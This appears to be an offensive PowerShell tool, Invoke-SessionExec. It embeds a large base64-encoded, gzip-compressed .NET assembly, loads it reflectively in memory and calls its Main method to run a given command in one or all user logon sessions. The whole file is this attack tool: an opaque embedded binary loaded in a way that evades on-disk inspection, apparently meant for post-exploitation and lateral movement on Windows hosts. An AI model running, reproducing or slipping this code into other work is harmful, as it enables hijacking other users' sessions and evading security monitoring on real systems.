function Invoke-SessionExec {
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $false, ValueFromRemainingArguments = $true)]
        [String[]]
        $Command
    )
    if(!$Command){Write-Output "Usage: Invoke-SessionExec <SessionID|All> <Command> [/NoOutput]";Write-Output "";return}
    $a = New-Object IO.MemoryStream (,[Convert]::FromBase64String("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"))
    $decompressed = New-Object IO.Compression.GzipStream ($a, [IO.Compression.CompressionMode]::Decompress)
    $output = New-Object System.IO.MemoryStream
    $decompressed.CopyTo($output)
    [byte[]] $byteOutArray = $output.ToArray()
    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)

    $vars = New-Object System.Collections.Generic.List[System.Object]
    $vars.AddRange($Command)

    $passed = [string[]] $vars.ToArray()

    $BindingFlags = [Reflection.BindingFlags] "NonPublic,Static"

    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)
    $PrivateMethod = [SessionExec.Program].GetMethod('Main', $BindingFlags)

    if ($PrivateMethod) {
        $PrivateMethod.Invoke($Null, (, $passed))
    } else {
        $PrivateMethod = [SessionExec.Program].GetMethod('Main')
        $PrivateMethod.Invoke($Null, (, $passed))
    }

    [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
    $Results
}
